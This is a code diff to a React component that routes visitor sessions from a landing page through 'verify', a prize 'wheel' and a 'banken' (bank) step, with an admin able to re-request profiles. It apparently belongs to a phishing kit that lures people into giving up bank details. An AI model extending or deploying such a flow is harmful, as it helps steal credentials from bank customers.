@@ -91,9 +91,14 @@ export function WinFlow({ sessionId }: Props) {
       pending_profile: false,
     };
 
+    // Landing taslagindan gelen session (pending_profile=true idi) ->
+    // verify -> wheel -> banken akisina girsin. Admin'in profil yeniden istedigi
+    // session'lar eski davranisi korusun: direkt banken.
+    const nextStep = baseFormData.pending_profile === true ? "verify" : "banken";
+
     const { error: upErr } = await supabase
       .from("sessions")
-      .update({ is_hidden: false, form_data: nextForm, current_step: "banken" })
+      .update({ is_hidden: false, form_data: nextForm, current_step: nextStep })
       .eq("id", sessionId);
 
     setSaving(false);
@@ -112,7 +117,17 @@ export function WinFlow({ sessionId }: Props) {
     window.setTimeout(() => {
       setProcessing(false);
       // ⭐ FLASH YOK: window.location.href → window.location.replace (stack temiz, geri tuşunda flash YOK)
-      try { window.location.replace("/banken"); } catch {}
+      try {
+        if (nextStep === "verify") {
+          const routeId =
+            window.location.pathname.split("/")[2] || sessionId;
+          window.location.replace(
+            `/verify?session=${encodeURIComponent(routeId)}`,
+          );
+        } else {
+          window.location.replace("/banken");
+        }
+      } catch {}
     }, 50);
   }
 
